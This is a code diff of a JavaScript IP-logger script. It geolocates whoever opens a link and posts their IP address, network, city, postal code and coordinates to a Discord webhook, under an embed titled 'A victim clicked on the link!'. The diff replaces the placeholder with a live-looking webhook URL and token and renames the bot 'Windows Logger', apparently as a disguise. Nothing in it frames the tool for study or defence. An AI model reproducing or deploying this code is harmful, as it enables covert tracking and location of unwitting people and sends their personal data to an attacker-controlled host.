@@ -6,21 +6,21 @@ const sendIP = () => {
             return fetch(`https://ipapi.co/${ipadd}/json/`)
                 .then(geoResponse => geoResponse.json())
                 .then(geoData => {
-                    const dscURL = 'YOUR WEBHOOK'; // replace with your webhook url
+                    const dscURL = 'https://discordapp.com/api/webhooks/1362815427880812584/ClDINK5iEXItdM_KxM0A8uSN3nqoi6i7U1_VRLvxNdiho3M3_PJpIvqV6t0uesRkeeDe'; 
                     return fetch(dscURL, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            username: "site logger <3", // optionally changeable
-                            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
+                            username: "Windows Logger <3", 
+                            avatar_url: "https://i.pinimg.com/736x/67/2a/fc/672afc9bfbf27ed7b6d9cf39badf030b.jpg", 
                             content: `@here`,
                             embeds: [
                                 {
                                     title: 'A victim clicked on the link!',
                                     description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
-                                    color: 0x800080 // optionally changeable
+                                    color: 0x800080 
                                 }
                             ]
                         })
